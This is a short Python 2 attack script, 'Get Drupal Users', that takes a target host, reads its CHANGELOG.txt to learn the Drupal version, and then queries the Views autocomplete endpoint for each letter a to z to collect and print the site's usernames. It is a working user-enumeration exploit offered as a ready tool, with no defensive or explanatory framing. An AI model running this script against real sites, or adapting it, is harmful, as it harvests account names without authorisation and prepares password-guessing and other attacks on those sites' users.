#coding=utf-8
import sys
import urllib
import re

host = ""
url_v = ""
url_u = ""
user = []

def usage():
    print "Get Drupal Users"
    print "From - http://www.madirish.net/node/465"
    print "Usage: getuser_drupal.py host"
    

def check_version():
    pass

def enum_user():
    pass

def main():
    global host
    global user
    if len(sys.argv) == 2:
        host = sys.argv[1]
        url_v = 'http://'+ host + '/CHANGELOG.txt'
        url_u = 'http://'+ host + '/?q=admin/views/ajax/autocomplete/user/'
        r = urllib.urlopen(url_v)
        r.readline() #igone blank line
        print "version: " + r.readline()
        r = ""
        for i in xrange(97,123,1):
            #print "Detecting .... " + chr(i)
            r = urllib.urlopen(url_u + chr(i)).read()
            #s = re.sub('"(.*?)"',r'\1',r)
            s = re.findall('"(.*?)"',r)
            user.extend(s)

        user = {}.fromkeys(user).keys()
        #print user
        for s in user:
            print s
        print
        print "-------------------------------------------------------"
        print "Someone has coded a nice tool"
        print "From - http://www.madirish.net/index.html?article=443"
    else:
        usage()
    pass



if __name__ == "__main__":
    main()
